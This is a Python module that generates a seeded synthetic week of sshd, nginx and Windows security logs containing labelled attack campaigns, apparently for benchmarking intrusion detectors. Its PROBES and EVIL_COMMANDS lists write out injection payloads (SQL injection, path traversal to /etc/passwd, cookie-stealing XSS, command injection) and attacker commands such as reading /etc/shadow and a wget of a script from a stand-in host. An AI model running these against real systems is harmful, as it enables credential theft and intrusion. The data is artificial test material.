"""A made-up but realistic week of logs, with the attacks written down.

Real labelled logs that mix sshd, nginx and Windows events do not exist in the open, and
real logs cannot be published. This module writes what such a machine room would produce, in
the real file formats, and records which entity attacked when, so detectors can be scored.

Normal life, every day:
* a website with 500 regular visitors, crawlers and a health check every minute
* three staff and a deploy bot logging in over SSH, sudo, a nightly backup, and the constant
  low-level password guessing every public SSH port receives (one to three tries per source)
* a Windows desktop: interactive and service logons, unlocks, a typo now and then, updates

Then, in the test days, campaigns: SSH brute force, password spraying, user enumeration,
account takeover and a slow-and-low guesser; web scanners, injection probes, floods and login
brute force; RDP brute force, a Windows takeover and a persistence burst.

Everything is random but seeded, so a dataset can be rebuilt exactly.
"""

from __future__ import annotations

import json
import math
import random
from dataclasses import asdict, dataclass, field
from datetime import UTC, datetime
from pathlib import Path
from urllib.parse import quote

DAY = 86400.0
WEB = "web01"
DB = "db01"
DESK = "WIN-DESK01"
_MONTHS = ("Jan", "Feb", "Mar", "Apr", "May", "Jun", "Jul", "Aug", "Sep", "Oct", "Nov", "Dec")

USER_AGENTS = (
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64; rv:131.0) Gecko/20100101 Firefox/131.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148",
    "Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0 Mobile Safari/537.36",
)
CRAWLERS = (
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
    "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)",
)
SCANNER_AGENTS = (
    "Nikto/2.1.6",
    "sqlmap/1.7.2",
    "python-requests/2.31.0",
    "-",
    "zgrab/0.x",
    "curl/8.4.0",
)
PAGES = ("/", "/about", "/products", "/products/1", "/products/2", "/products/3", "/blog", "/blog/hello",
         "/blog/news", "/contact", "/faq", "/pricing", "/team", "/careers", "/privacy")  # fmt: skip
ASSETS = ("/static/app.js", "/static/site.css", "/static/logo.png", "/static/hero.jpg",
          "/static/font.woff2", "/favicon.ico")  # fmt: skip
SCAN_PATHS = ("/admin", "/wp-login.php", "/.env", "/phpmyadmin/", "/backup.zip", "/.git/config",
              "/config.php", "/server-status", "/xmlrpc.php", "/administrator/", "/db.sql",
              "/wp-admin/", "/cgi-bin/test.cgi", "/old/", "/test/", "/api/v1/users", "/console")  # fmt: skip
PROBES = ("/product?id=1' OR '1'='1", "/product?id=1 UNION SELECT username,password FROM users--",
          "/download?file=../../../../etc/passwd", "/search?q=<script>alert(document.cookie)</script>",
          "/index.php?page=php://filter/convert.base64-encode/resource=index",
          "/view?template=..%2f..%2f..%2fwindows/win.ini", "/api?cmd=;cat /etc/passwd",
          "/login?next=javascript:alert(1)", "/item?id=1;WAITFOR DELAY '0:0:5'--")  # fmt: skip
QUERIES = ("?page=2", "?ref=news", "?q=shoes", "?utm_source=mail", "?q=men's+shoes", "?q=(blue)+shirt",
           "?q=caf%C3%A9", "?redirect=%2Fcart%2F", "?sort=price&dir=desc&page=3",
           "?utm_source=newsletter&utm_medium=email&utm_campaign=autumn-2026&fbclid=",
           "?q=50%25+off", "?lang=it&ref=a(b)")  # fmt: skip
STAFF = ("alice", "bob", "carol")
GUESSED = ("root", "admin", "ubuntu", "test", "oracle", "postgres", "user", "guest", "pi", "git",
           "ftp", "www", "mysql", "jenkins", "tomcat", "nagios", "support", "dev", "ec2-user",
           "debian", "vagrant", "ansible", "hadoop", "elastic", "minecraft", "steam", "backup")  # fmt: skip
SUDO_COMMANDS = ("/usr/bin/apt update", "/usr/bin/systemctl restart nginx", "/usr/bin/journalctl -u ssh",
                 "/usr/bin/tail /var/log/syslog", "/usr/bin/docker ps", "/usr/bin/less /etc/nginx/nginx.conf")  # fmt: skip
EVIL_COMMANDS = ("/bin/cat /etc/shadow", "/usr/bin/find / -perm -4000", "/bin/bash",
                 "/usr/bin/wget http://203.0.113.9/x.sh", "/usr/bin/crontab -l", "/bin/su -")  # fmt: skip
WIN_USERS = (
    "administrator",
    "admin",
    "user",
    "guest",
    "test",
    "support",
    "scanner",
    "backup",
    "sql",
    "luca",
)

ATTACK_TYPES = (
    "ssh_bruteforce", "ssh_spray", "ssh_enum", "ssh_takeover", "ssh_slow",
    "web_scan", "web_probe", "web_flood", "web_login_brute",
    "win_rdp_brute", "win_takeover", "win_persistence",
)  # fmt: skip
# Per week of test days: how many campaigns of each type. Slow-and-low is a known blind spot of
# a window detector and is reported separately.
ATTACKS_PER_WEEK = {"ssh_bruteforce": 6, "ssh_spray": 4, "ssh_enum": 4, "ssh_takeover": 4,
                    "ssh_slow": 3, "web_scan": 6, "web_probe": 5, "web_flood": 4,
                    "web_login_brute": 4, "win_rdp_brute": 5, "win_takeover": 3,
                    "win_persistence": 3}  # fmt: skip
HARD = frozenset({"ssh_slow"})


@dataclass
class Attack:
    """One campaign, as the label file records it."""

    id: int
    type: str
    entities: list[str]
    start: float
    end: float
    split: str  # "train" or "test"
    hard: bool = False


@dataclass
class DatasetSpec:
    days: int = 14
    train_days: int = 7
    seed: int = 1
    start: str = "2026-10-05"  # a Monday, UTC midnight
    dirty: float = 0.0  # attacks hidden in the training days, as a share of the test attacks
    scale: float = 1.0  # multiplies the amount of normal activity


@dataclass
class Dataset:
    """Lines per file, ready to write, and the labels."""

    auth: list[tuple[float, str]] = field(default_factory=list)
    journal: list[tuple[float, str]] = field(default_factory=list)
    web: list[tuple[float, str]] = field(default_factory=list)
    windows: list[tuple[float, str]] = field(default_factory=list)
    attacks: list[Attack] = field(default_factory=list)


# ------------------------------------------------------------------------------ line writers


def _syslog(ts: float, host: str, prog: str, pid: int, msg: str) -> str:
    t = datetime.fromtimestamp(ts, UTC)
    return f"{_MONTHS[t.month - 1]} {t.day:2d} {t:%H:%M:%S} {host} {prog}[{pid}]: {msg}"


def _journal(ts: float, host: str, prog: str, pid: int, msg: str) -> str:
    return json.dumps({
        "__REALTIME_TIMESTAMP": str(int(ts * 1_000_000)), "_HOSTNAME": host,
        "SYSLOG_IDENTIFIER": prog, "_PID": str(pid), "PRIORITY": "5", "MESSAGE": msg,
    })  # fmt: skip


def _access(ts: float, ip: str, method: str, path: str, status: int, size: int, agent: str) -> str:
    t = datetime.fromtimestamp(ts, UTC)
    stamp = f"{t.day:02d}/{_MONTHS[t.month - 1]}/{t.year}:{t:%H:%M:%S} +0000"
    safe = quote(path, safe="/?&=%.-_~:;,")
    return f'{ip} - - [{stamp}] "{method} {safe} HTTP/1.1" {status} {size} "-" "{agent}"'


def _win(ts: float, event_id: int, data: dict[str, str], host: str = DESK) -> str:
    t = datetime.fromtimestamp(ts, UTC)
    return json.dumps({
        "TimeCreated": t.strftime("%Y-%m-%dT%H:%M:%S.0000000Z"), "EventID": event_id,
        "Computer": host, "Channel": "Security", "Data": data,
    })  # fmt: skip


# ---------------------------------------------------------------------------------- the world


class _World:
    """Holds the random generator and writes events into a dataset."""

    def __init__(self, spec: DatasetSpec) -> None:
        self.spec = spec
        self.rng = random.Random(spec.seed)
        self.start = datetime.fromisoformat(spec.start).replace(tzinfo=UTC).timestamp()
        self.train_end = self.start + spec.train_days * DAY
        self.end = self.start + spec.days * DAY
        self.data = Dataset()
        self.visitors = [f"198.51.100.{i}" for i in range(1, 255)] + [
            f"203.0.113.{i}" for i in range(1, 255)
        ]
        self.rng.shuffle(self.visitors)
        self.visitors = self.visitors[:500]
        self.home = {name: f"192.0.2.{10 + i}" for i, name in enumerate(STAFF)}
        self.office = "10.0.0.20"
        self.used_attackers: set[str] = set()
        self._pid = 1000
        self._attack_id = 0

    # helpers ------------------------------------------------------------------------------
    def pid(self) -> int:
        self._pid += self.rng.randint(1, 40)
        return self._pid

    def port(self) -> int:
        return self.rng.randint(32768, 60999)

    def attacker_ip(self) -> str:
        while True:
            ip = (
                f"{self.rng.choice((45, 91, 103, 185, 193, 218))}.{self.rng.randint(1, 254)}."
                f"{self.rng.randint(1, 254)}.{self.rng.randint(1, 254)}"
            )
            if ip not in self.used_attackers:
                self.used_attackers.add(ip)
                return ip

    def auth(self, ts: float, host: str, prog: str, msg: str, pid: int | None = None) -> None:
        pid = pid or self.pid()
        if host == DB:
            self.data.journal.append((ts, _journal(ts, host, prog, pid, msg)))
        else:
            self.data.auth.append((ts, _syslog(ts, host, prog, pid, msg)))

    def web(
        self, ts: float, ip: str, path: str, status: int, agent: str, method: str = "GET"
    ) -> None:
        size = self.rng.randint(180, 9000) if status < 400 else self.rng.randint(150, 600)
        self.data.web.append((ts, _access(ts, ip, method, path, status, size, agent)))

    def ssh_ok(self, ts: float, host: str, user: str, ip: str, method: str = "publickey") -> None:
        extra = ": ED25519 SHA256:xxxx" if method == "publickey" else ""
        self.auth(
            ts,
            host,
            "sshd",
            f"Accepted {method} for {user} from {ip} port {self.port()} ssh2{extra}",
        )

    def ssh_fail(self, ts: float, host: str, user: str, ip: str, invalid: bool = False) -> None:
        pid = self.pid()
        if invalid:
            self.auth(
                ts - 0.2, host, "sshd", f"Invalid user {user} from {ip} port {self.port()}", pid
            )
        who = f"invalid user {user}" if invalid else user
        self.auth(
            ts, host, "sshd", f"Failed password for {who} from {ip} port {self.port()} ssh2", pid
        )

    def sudo(self, ts: float, host: str, user: str, command: str, fail: bool = False) -> None:
        pid = self.pid()
        if fail:
            self.auth(
                ts - 2,
                host,
                "sudo",
                f"{user} : 1 incorrect password attempt ; TTY=pts/0 ; "
                f"PWD=/home/{user} ; USER=root ; COMMAND={command}",
                pid,
            )
        self.auth(
            ts,
            host,
            "sudo",
            f"{user} : TTY=pts/0 ; PWD=/home/{user} ; USER=root ; COMMAND={command}",
            pid,
        )

    # normal life --------------------------------------------------------------------------
    def normal_day(self, day: int) -> None:
        t0 = self.start + day * DAY
        weekday = datetime.fromtimestamp(t0, UTC).weekday() < 5
        self.web_traffic(t0)
        self.ssh_staff(t0, weekday)
        self.ssh_background(t0)
        self.windows_day(t0, weekday)

    def hour_weights(self) -> list[float]:
        return [
            0.25 if h < 6 or h >= 23 else 0.4 + max(0.0, math.sin(math.pi * (h - 6) / 17))
            for h in range(24)
        ]

    def web_traffic(self, t0: float) -> None:
        rng, scale = self.rng, self.spec.scale
        weights = self.hour_weights()
        total = sum(weights)
        for hour, weight in enumerate(weights):
            for _ in range(self.poisson(520 * scale * weight / total * 1.0 * 1)):
                self.visit(t0 + hour * 3600 + rng.uniform(0, 3600))
        for minute in range(0, 1440):  # the health check
            self.web(
                t0 + minute * 60 + rng.uniform(0, 2), "10.0.0.5", "/health", 200, "kube-probe/1.28"
            )
        for minute in range(0, 1440, 5):  # an external uptime service
            self.web(
                t0 + minute * 60 + rng.uniform(0, 4), "198.51.100.250", "/", 200, "UptimeRobot/2.0"
            )
        for _ in range(rng.randint(1, 2)):  # search-engine crawlers
            self.crawl(t0 + rng.uniform(0, DAY - 1200))
        if rng.random() < 0.5:  # a visitor who downloads everything at once
            ip, agent = rng.choice(self.visitors), rng.choice(USER_AGENTS)
            start = t0 + rng.uniform(0, DAY - 100)
            for i in range(rng.randint(25, 45)):
                self.web(start + i * rng.uniform(0.2, 0.9), ip, rng.choice(ASSETS), 200, agent)

    def poisson(self, mean: float) -> int:
        limit, k, p = math.exp(-mean), 0, 1.0
        if mean > 50:  # normal approximation, fast enough and close enough
            return max(0, round(self.rng.gauss(mean, math.sqrt(mean))))
        while True:
            p *= self.rng.random()
            if p <= limit:
                return k
            k += 1

    def visit(self, ts: float) -> None:
        rng = self.rng
        index = min(int(rng.paretovariate(0.9)) - 1, len(self.visitors) - 1)
        ip, agent = self.visitors[index], rng.choice(USER_AGENTS)
        for _ in range(min(12, 1 + int(rng.expovariate(0.45)))):
            page = rng.choice(PAGES)
            if rng.random() < 0.03:
                page = f"/old-page-{rng.randint(1, 30)}"
            if rng.random() < 0.2:
                page += rng.choice(QUERIES)
                if page.endswith("fbclid="):
                    page += "".join(rng.choices("abcdefghijklmnopqrstuvwxyz0123456789", k=34))
            status = (
                404 if page.startswith("/old-page") else rng.choice((200,) * 17 + (304, 301, 304))
            )
            self.web(ts, ip, page, status, agent)
            if status == 200:
                for asset in rng.sample(ASSETS, rng.randint(0, 5)):
                    self.web(ts + rng.uniform(0.05, 1.5), ip, asset, rng.choice((200, 304)), agent)
            if rng.random() < 0.02:
                self.web(ts + 3, ip, "/contact", rng.choice((200, 302)), agent, "POST")
            if rng.random() < 0.012:
                ok = rng.random() > 0.2
                self.web(ts + 4, ip, "/login", 302 if ok else 401, agent, "POST")
            ts += rng.uniform(4, 70)

    def crawl(self, ts: float) -> None:
        rng = self.rng
        ip, agent = f"66.249.66.{rng.randint(1, 30)}", rng.choice(CRAWLERS)
        self.web(ts, ip, "/robots.txt", 200, agent)
        for _ in range(rng.randint(30, 120)):
            ts += rng.uniform(1, 4)
            page = rng.choice(PAGES) if rng.random() > 0.04 else f"/old-page-{rng.randint(1, 30)}"
            self.web(ts, ip, page, 404 if "old-page" in page else 200, agent)

    def ssh_staff(self, t0: float, weekday: bool) -> None:
        rng = self.rng
        for user in STAFF:
            for _ in range(rng.randint(1, 3) if weekday else (1 if rng.random() < 0.2 else 0)):
                ts = t0 + rng.uniform(8, 19) * 3600
                host = rng.choice((WEB, WEB, DB))
                ip = self.home[user] if rng.random() < 0.7 else self.office
                self.session(ts, host, user, ip, rng.choice(("publickey",) * 7 + ("password",) * 3))
        for hour in range(0, 24, 2):  # the deploy bot
            ts = t0 + hour * 3600 + rng.uniform(0, 600)
            host = rng.choice((WEB, DB))
            self.ssh_ok(ts, host, "deploy", "192.0.2.50")
            if rng.random() < 0.7:
                self.sudo(ts + rng.uniform(2, 8), host, "deploy", "/usr/bin/systemctl restart app")
        ts = t0 + 2 * 3600 + rng.uniform(0, 60)  # the nightly backup
        for command in (
            "/usr/bin/rsync -a /var/www /backup",
            "/usr/bin/tar czf /backup/db.tgz /var/lib/db",
        ):
            self.sudo(ts, WEB, "backup", command)
            ts += rng.uniform(20, 90)
        if rng.random() < 0.2:  # an admin who fat-fingers the password a few times
            user = rng.choice(STAFF)
            ts = t0 + rng.uniform(9, 18) * 3600
            for _ in range(rng.randint(3, 5)):
                self.ssh_fail(ts, WEB, user, self.home[user])
                ts += rng.uniform(3, 9)
            self.ssh_ok(ts, WEB, user, self.home[user], "password")
        if rng.random() < 0.3:  # a long maintenance session
            user, ts = rng.choice(STAFF), t0 + rng.uniform(9, 17) * 3600
            self.ssh_ok(ts, WEB, user, self.home[user])
            for _ in range(rng.randint(12, 25)):
                ts += rng.uniform(5, 14)
                self.sudo(ts, WEB, user, rng.choice(SUDO_COMMANDS))

    def session(self, ts: float, host: str, user: str, ip: str, method: str) -> None:
        rng = self.rng
        if rng.random() < 0.06:
            for _ in range(rng.randint(1, 3)):
                self.ssh_fail(ts, host, user, ip)
                ts += rng.uniform(3, 10)
            method = "password"
        self.ssh_ok(ts, host, user, ip, method)
        for _ in range(self.poisson(2)):
            ts += rng.uniform(10, 120)
            self.sudo(ts, host, user, rng.choice(SUDO_COMMANDS), fail=rng.random() < 0.03)

    def ssh_background(self, t0: float) -> None:
        """The few tries every public SSH port gets all day: not worth anyone's attention."""
        rng = self.rng
        for _ in range(self.poisson(7)):
            ip = f"{rng.choice((45, 91, 103, 185, 193, 218))}.{rng.randint(1, 254)}.{rng.randint(1, 254)}.{rng.randint(1, 254)}"
            ts, host = t0 + rng.uniform(0, DAY), rng.choice((WEB, DB))
            for _ in range(rng.randint(1, 3)):
                self.ssh_fail(ts, host, rng.choice(GUESSED), ip, invalid=rng.random() < 0.7)
                ts += rng.uniform(2, 15)
            if rng.random() < 0.4:
                self.auth(
                    ts,
                    host,
                    "sshd",
                    f"Connection closed by authenticating user root {ip} port {self.port()} [preauth]",
                )
        for _ in range(self.poisson(3)):
            ip = f"{rng.choice((45, 91, 103))}.{rng.randint(1, 254)}.{rng.randint(1, 254)}.{rng.randint(1, 254)}"
            self.auth(
                t0 + rng.uniform(0, DAY),
                rng.choice((WEB, DB)),
                "sshd",
                f"Did not receive identification string from {ip} port {self.port()}",
            )

    def windows_day(self, t0: float, weekday: bool) -> None:
        rng = self.rng
        for hour in range(24):  # service logons
            ts = t0 + hour * 3600 + rng.uniform(0, 1800)
            for _ in range(rng.randint(2, 5)):
                self.logon(ts, 5, "SYSTEM", "-")
                ts += rng.uniform(0.5, 6)
        if weekday:
            ts = t0 + rng.uniform(7.5, 10) * 3600
            self.logon(ts, 2, "luca", "-")
            self.data.windows.append((ts + 1, _win(ts + 1, 4672, {"SubjectUserName": "luca"})))
            for _ in range(rng.randint(2, 6)):
                ts += rng.uniform(1500, 6000)
                if rng.random() < 0.05:
                    self.logon(ts - 5, 2, "luca", "-", failed=True)
                self.logon(ts, 7, "luca", "-")
            for _ in range(rng.randint(1, 4)):  # file shares on the NAS
                ts = t0 + rng.uniform(9, 18) * 3600
                self.logon(ts, 3, "luca", "10.0.0.30")
        if rng.random() < 0.2:  # Windows Update
            ts = t0 + rng.uniform(1, 5) * 3600
            self.data.windows.append(
                (
                    ts,
                    _win(
                        ts,
                        7045,
                        {"ServiceName": "UpdateOrchestrator", "AccountName": "LocalSystem"},
                    ),
                )
            )
            self.data.windows.append(
                (
                    ts + 2,
                    _win(
                        ts + 2,
                        4698,
                        {
                            "SubjectUserName": "SYSTEM",
                            "TaskName": "\\Microsoft\\Windows\\UpdateOrchestrator",
                        },
                    ),
                )
            )

    def logon(self, ts: float, logon_type: int, user: str, ip: str, failed: bool = False) -> None:
        data = {"TargetUserName": user, "TargetDomainName": DESK, "LogonType": str(logon_type),
                "IpAddress": ip, "WorkstationName": "-"}  # fmt: skip
        if failed:
            data |= {"Status": "0xc000006d", "SubStatus": "0xc000006a"}
        self.data.windows.append((ts, _win(ts, 4625 if failed else 4624, data)))

    # attacks ------------------------------------------------------------------------------
    def record(self, kind: str, entities: list[str], start: float, end: float, split: str) -> None:
        self._attack_id += 1
        self.data.attacks.append(Attack(self._attack_id, kind, entities, start, end, split,
                                        hard=kind in HARD))  # fmt: skip

    def attack(self, kind: str, ts: float, split: str) -> None:
        getattr(self, f"_{kind}")(ts, split)

    def _ssh_bruteforce(self, ts: float, split: str) -> None:
        rng, ip, host = self.rng, self.attacker_ip(), self.rng.choice((WEB, DB))
        users, first = rng.sample(GUESSED[:5], rng.randint(1, 3)), ts
        for i in range(rng.randint(25, 250)):
            self.ssh_fail(ts, host, rng.choice(users), ip, invalid=users[0] in ("test", "oracle"))
            if i % 3 == 2:
                self.auth(
                    ts + 0.5,
                    host,
                    "sshd",
                    f"Connection closed by authenticating user {users[0]} {ip} port {self.port()} [preauth]",
                )
            ts += rng.expovariate(1 / rng.uniform(1.5, 4))
        self.record("ssh_bruteforce", [f"ip:{ip}"], first, ts, split)

    def _ssh_spray(self, ts: float, split: str) -> None:
        rng, ip, host = self.rng, self.attacker_ip(), self.rng.choice((WEB, DB))
        first = ts
        for user in rng.sample(GUESSED, rng.randint(15, 27)):
            for _ in range(rng.randint(1, 2)):
                self.ssh_fail(ts, host, user, ip, invalid=True)
                ts += rng.uniform(2, 5)
            ts += rng.uniform(4, 20)
        self.record("ssh_spray", [f"ip:{ip}"], first, ts, split)

    def _ssh_enum(self, ts: float, split: str) -> None:
        rng, ip, host = self.rng, self.attacker_ip(), self.rng.choice((WEB, DB))
        first = ts
        for _ in range(rng.randint(12, 60)):
            user = rng.choice(GUESSED) + str(rng.randint(0, 99))
            self.auth(ts, host, "sshd", f"Invalid user {user} from {ip} port {self.port()}")
            self.auth(
                ts + 0.3,
                host,
                "sshd",
                f"Connection closed by invalid user {user} {ip} port {self.port()} [preauth]",
            )
            ts += rng.uniform(1, 6)
        self.record("ssh_enum", [f"ip:{ip}"], first, ts, split)

    def _ssh_takeover(self, ts: float, split: str) -> None:
        rng, ip, host = self.rng, self.attacker_ip(), WEB
        ts = math.floor(ts / DAY) * DAY + rng.uniform(1, 5) * 3600  # at night
        user, first = rng.choice(STAFF), ts
        for _ in range(rng.randint(0, 3)):
            self.ssh_fail(ts, host, user, ip)
            ts += rng.uniform(3, 8)
        self.ssh_ok(ts, host, user, ip, "password")
        last = ts
        for _ in range(rng.randint(3, 9)):
            last += rng.uniform(15, 70)
            self.sudo(last, host, user, rng.choice(EVIL_COMMANDS), fail=rng.random() < 0.2)
        self.record("ssh_takeover", [f"ip:{ip}", f"user:{user}@{host}"], first, last, split)

    def _ssh_slow(self, ts: float, split: str) -> None:
        rng, ip, host = self.rng, self.attacker_ip(), self.rng.choice((WEB, DB))
        first = ts
        for _ in range(rng.randint(12, 24)):
            self.ssh_fail(ts, host, rng.choice(GUESSED[:8]), ip, invalid=True)
            ts += rng.uniform(420, 900)
        self.record("ssh_slow", [f"ip:{ip}"], first, ts, split)

    def _web_scan(self, ts: float, split: str) -> None:
        rng, ip, first = self.rng, self.attacker_ip(), ts
        agent = rng.choice(SCANNER_AGENTS) if rng.random() < 0.7 else rng.choice(USER_AGENTS)
        for _ in range(rng.randint(80, 600)):
            path = (
                rng.choice(SCAN_PATHS)
                if rng.random() < 0.8
                else f"/{rng.choice(GUESSED)}{rng.randint(0, 999)}"
            )
            self.web(ts, ip, path, rng.choice((404,) * 18 + (403, 301)), agent)
            ts += rng.uniform(0.15, 1.5)
        self.record("web_scan", [f"ip:{ip}"], first, ts, split)

    def _web_probe(self, ts: float, split: str) -> None:
        rng, ip, first, agent = self.rng, self.attacker_ip(), ts, self.rng.choice(USER_AGENTS)
        for _ in range(rng.randint(15, 60)):
            self.web(ts, ip, rng.choice(PROBES), rng.choice((200, 200, 400, 500, 403)), agent)
            ts += rng.uniform(1, 4)
        self.record("web_probe", [f"ip:{ip}"], first, ts, split)

    def _web_flood(self, ts: float, split: str) -> None:
        rng, ip, first = self.rng, self.attacker_ip(), ts
        agent = rng.choice((*USER_AGENTS, "python-requests/2.31.0"))
        path = rng.choice(("/", "/search?q=a", "/products"))
        for _ in range(rng.randint(400, 2500)):
            self.web(ts, ip, path, rng.choice((200,) * 9 + (503,)), agent)
            ts += rng.uniform(0.03, 0.15)
        self.record("web_flood", [f"ip:{ip}"], first, ts, split)

    def _web_login_brute(self, ts: float, split: str) -> None:
        rng, ip, first = self.rng, self.attacker_ip(), ts
        agent = rng.choice(USER_AGENTS)
        for _ in range(rng.randint(60, 300)):
            self.web(ts, ip, "/login", 401, agent, "POST")
            ts += rng.uniform(0.5, 3)
        self.record("web_login_brute", [f"ip:{ip}"], first, ts, split)

    def _win_rdp_brute(self, ts: float, split: str) -> None:
        rng, ip, first = self.rng, self.attacker_ip(), ts
        for _ in range(rng.randint(30, 300)):
            self.logon(ts, rng.choice((10, 3)), rng.choice(WIN_USERS), ip, failed=True)
            ts += rng.uniform(0.8, 6)
        self.record("win_rdp_brute", [f"ip:{ip}"], first, ts, split)

    def _win_takeover(self, ts: float, split: str) -> None:
        rng, ip = self.rng, self.attacker_ip()
        ts = math.floor(ts / DAY) * DAY + rng.uniform(1, 5) * 3600
        first = ts
        for _ in range(rng.randint(3, 8)):
            self.logon(ts, 10, "luca", ip, failed=True)
            ts += rng.uniform(2, 8)
        self.logon(ts, 10, "luca", ip)
        self.data.windows.append((ts + 1, _win(ts + 1, 4672, {"SubjectUserName": "luca"})))
        self.record("win_takeover", [f"ip:{ip}", f"user:luca@{DESK}"], first, ts + 1, split)

    def _win_persistence(self, ts: float, split: str) -> None:
        rng = self.rng
        ts = math.floor(ts / DAY) * DAY + rng.uniform(1, 5) * 3600
        first = ts
        steps = ((4720, {"SubjectUserName": "luca", "TargetUserName": "support$"}),
                 (4732, {"SubjectUserName": "luca", "TargetUserName": "Administrators", "MemberName": "support$"}),
                 (4698, {"SubjectUserName": "luca", "TaskName": "\\Updater"}),
                 (7045, {"ServiceName": "WinSvcHelper", "AccountName": "luca"}))  # fmt: skip
        for event_id, data in steps:
            self.data.windows.append((ts, _win(ts, event_id, data)))
            ts += rng.uniform(5, 50)
        self.record("win_persistence", [f"user:luca@{DESK}"], first, ts, "test")


def generate(spec: DatasetSpec | None = None) -> Dataset:
    """Build a dataset in memory."""
    spec = spec or DatasetSpec()
    if not 1 <= spec.train_days < spec.days:
        raise ValueError("train_days must be at least 1 and less than days")
    world = _World(spec)
    for day in range(spec.days):
        world.normal_day(day)
    rng = world.rng
    test_days = spec.days - spec.train_days
    for kind in ATTACK_TYPES:
        count = max(1, round(ATTACKS_PER_WEEK[kind] * test_days / 7))
        for _ in range(count):
            hours = rng.uniform(0, test_days * 24 - 1)
            world.attack(kind, world.train_end + hours * 3600, "test")
        if spec.dirty > 0 and kind not in HARD:  # attacks the model will see while learning
            for _ in range(max(0, round(count * spec.dirty))):
                hours = rng.uniform(24, spec.train_days * 24 - 1)
                world.attack(kind, world.start + hours * 3600, "train")
    return world.data


def write(data: Dataset, spec: DatasetSpec, out: str | Path) -> Path:
    """Write the log files, labels and a manifest into `out`."""
    root = Path(out)
    root.mkdir(parents=True, exist_ok=True)
    for name, lines in (("auth.log", data.auth), ("journal.jsonl", data.journal),
                        ("access.log", data.web), ("windows-security.jsonl", data.windows)):  # fmt: skip
        ordered = sorted(lines, key=lambda item: item[0])
        (root / name).write_text("".join(line + "\n" for _, line in ordered), encoding="utf-8")
    (root / "labels.jsonl").write_text(
        "".join(json.dumps(asdict(a)) + "\n" for a in data.attacks), encoding="utf-8"
    )
    start = datetime.fromisoformat(spec.start).replace(tzinfo=UTC).timestamp()
    manifest = {"start": start, "train_end": start + spec.train_days * DAY,
                "end": start + spec.days * DAY, "year": int(spec.start[:4]), "seed": spec.seed,
                "dirty": spec.dirty, "days": spec.days, "train_days": spec.train_days}  # fmt: skip
    (root / "manifest.json").write_text(json.dumps(manifest, indent=1) + "\n", encoding="utf-8")
    return root
